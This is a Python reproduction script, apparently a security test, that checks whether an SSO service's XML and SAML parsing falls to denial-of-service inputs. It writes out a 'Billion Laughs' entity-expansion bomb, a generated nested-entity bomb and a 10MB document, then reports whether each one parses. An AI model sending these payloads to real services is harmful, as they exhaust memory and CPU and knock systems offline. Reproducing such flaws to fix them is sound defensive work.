#!/usr/bin/env python3
"""
Reproduction script for XML Bomb DoS vulnerability in SSO Service.

This script demonstrates how a malicious SAML response can cause
exponential memory growth and CPU exhaustion through XML entity expansion.
"""

import xml.etree.ElementTree as ET
import time

def create_xml_bomb():
    """Create an XML bomb with exponential entity expansion."""
    xml_bomb = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>"""
    return xml_bomb

def create_nested_xml_bomb(depth=100):
    """Create a deeply nested XML bomb."""
    nested_bomb = "<?xml version=\"1.0\"?>\n"
    nested_bomb += "<!DOCTYPE root [\n"
    
    # Create deeply nested entities
    for i in range(depth):
        if i == 0:
            nested_bomb += f"  <!ENTITY level{i} 'data'>\n"
        else:
            nested_bomb += f"  <!ENTITY level{i} '&level{i-1};&level{i-1};'>\n"
    
    nested_bomb += "]>\n"
    nested_bomb += f"<root>&level{depth-1};</root>"
    return nested_bomb

def test_xml_bomb_vulnerability():
    """Test the XML bomb vulnerability against ET.fromstring."""
    print("Testing XML Bomb DoS Vulnerability")
    print("=" * 50)
    
    # Test 1: Classic XML bomb
    print("\n1. Testing classic XML bomb (Billion Laughs attack)...")
    xml_bomb = create_xml_bomb()
    
    try:
        start_time = time.time()
        # This is exactly how the SSO service parses XML
        root = ET.fromstring(xml_bomb)
        end_time = time.time()
        
        print(f"   [VULNERABLE] XML bomb parsed successfully in {end_time - start_time:.4f}s")
        print(f"   Result size: {len(str(root))} characters")
        return True
    except Exception as e:
        end_time = time.time()
        print(f"   [PROTECTED] XML bomb rejected in {end_time - start_time:.4f}s - {type(e).__name__}: {e}")
        return False

def test_nested_xml_bomb():
    """Test deeply nested XML bomb."""
    print("\n2. Testing deeply nested XML bomb...")
    
    for depth in [10, 50, 100]:
        print(f"\n   Testing depth {depth}...")
        nested_bomb = create_nested_xml_bomb(depth)
        
        try:
            start_time = time.time()
            root = ET.fromstring(nested_bomb)
            end_time = time.time()
            
            print(f"      [VULNERABLE] Nested XML bomb (depth {depth}) parsed in {end_time - start_time:.4f}s")
            print(f"      Result size: {len(str(root))} characters")
            return True
        except Exception as e:
            end_time = time.time()
            print(f"      [PROTECTED] Nested XML bomb (depth {depth}) rejected in {end_time - start_time:.4f}s")
    
    return False

def test_large_xml():
    """Test with very large XML content."""
    print("\n3. Testing large XML content...")
    
    # Create XML with large content
    large_xml = "<?xml version=\"1.0\"?><root>"
    large_xml += "A" * 10_000_000  # 10MB of 'A' characters
    large_xml += "</root>"
    
    try:
        start_time = time.time()
        root = ET.fromstring(large_xml)
        end_time = time.time()
        
        print(f"   [VULNERABLE] Large XML (10MB) parsed in {end_time - start_time:.4f}s")
        print(f"   Memory usage: ~{len(large_xml) / 1024 / 1024:.1f} MB")
        return True
    except Exception as e:
        end_time = time.time()
        print(f"   [PROTECTED] Large XML rejected in {end_time - start_time:.4f}s - {type(e).__name__}: {e}")
        return False

if __name__ == "__main__":
    print("XML DoS Vulnerability Test for SSO Service")
    print("This tests the same XML parsing code used in sso_service.py")
    print()
    
    vulnerabilities_found = []
    
    if test_xml_bomb_vulnerability():
        vulnerabilities_found.append("Classic XML Bomb (Billion Laughs)")
    
    if test_nested_xml_bomb():
        vulnerabilities_found.append("Deeply Nested XML Bomb")
    
    if test_large_xml():
        vulnerabilities_found.append("Large XML Content")
    
    print("\n" + "=" * 50)
    print("SUMMARY:")
    if vulnerabilities_found:
        print(f"[VULNERABILITIES FOUND] {', '.join(vulnerabilities_found)}")
        print("\nThe SSO service is vulnerable to XML-based DoS attacks.")
        print("An attacker can send malicious SAML responses that cause:")
        print("- Exponential memory growth (XML bombs)")
        print("- Stack overflow (deeply nested XML)")
        print("- Memory exhaustion (large XML content)")
        exit(1)
    else:
        print("[PROTECTED] No XML DoS vulnerabilities detected")
        exit(0)